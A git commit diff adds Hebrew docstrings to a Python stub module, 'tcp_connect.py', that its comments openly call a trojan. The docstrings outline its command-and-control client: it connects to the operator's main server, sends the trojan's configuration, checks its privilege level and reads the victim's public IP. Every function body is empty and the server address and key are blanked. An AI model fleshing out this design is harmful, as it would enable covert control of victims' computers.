01ad56dfa6193698d2cc0030ad0a2cdf4aa47863
Avraham sabann <66841899+albertmonamor@users.noreply.github.com>
2023-09-12 15:15:02 +0300

    Update tcp_connect.py

--- Api/tcp_connect.py
+++ Api/tcp_connect.py
@@ -9,8 +9,15 @@ import platform, base64
 from time import sleep
 import ctypes
 
+# כתובת השרת הראשי שמנהל את כל רשת החיבורים
 HOST = "" #// hidden
+# מפתח שמשמש בעת התחברות לשרת הראשי
 KEY = "" #// hidden
+"""
+	---- MODE_PACKAGE ----
+ 	קטגוריות לתפעול הסוס 
+  	כל מצב מכיל פעולות רבות חצורך המימוש שלו
+"""
 MODE_PACKAGE = {
     0x1: "CONNECT",
     0x2: "PING",
@@ -32,42 +39,82 @@ class TcpConnect(TCPConfigPacket):
 		pass
 
     def tcp_create_socket(self):
+		"""
+		יצירת שקע	
+  		"""
 		pass
 
     def tcp_connect(self, __socket_error=10060) -> int:
+		"""
+  		מבצע חיבור, אם נכשל מחזיר את
+		LastError()
+  		"""
 		pass
 
     def tcp_send_protocol_trojan(self):
+		"""
+  		אחרי התחברות עם המפעיל, הסוס שולח את תצורת והגדרות הסוס 
+  		"""
 		pass
 
     def tcp_set_setting(self):
+		"""
+  		יציאה לשרת הראשי לקבלת הגדרות המפעיל, כתובת לחיבור, יציאה, ותצורת החיבור
+  		"""
 		pass
 
     def tcp_send_packet(self, packet:bytes):
+		"""
+  		שליחה של מידע 
+  		"""
 		pass
 
     def tcp_get_packet(self, enc=1):
+		"""
+  		קבלה של מידע 
+  		"""
 		pass
 
     def __receive(self) -> bytes:
+		"""
+  		קבלת מידע ע"פ הפרוטוקול
+  		"""
 		pass
 
     def __send(self, packet:bytes) -> None:
+		"""
+  		שליחת מידע ע"פ הפרוטוקול
+  		"""
 		pass
 
     def tcp_close(self):
+		"""
+  		סגירה וניקוי של החיבור 
+  		"""
 		pass
 
 def get_setting_from_server() -> tuple | bool:
+	"""
+ 	יציאה לשרת הראשי לקבלת הגדרות המפעיל, כתובת לחיבור, יציאה, ותצורת החיבור
+ 	"""
 	pass
 
 def get_privilege() -> int:
+	"""
+ 	שאילתה  בלבד!, ומחזיר  את התוצאה האם הסוס על משתמש חזק
+ 	"""
 	pass
 
 def get_platform():
+	"""
+ 	מחזיר את שם המערכת
+ 	"""
 	pass
 
 def get_public_ip():
+	"""
+ 	מחזיר את הכתובת הציבורית של רשת הקורבן
+ 	"""
 	pass
 
 
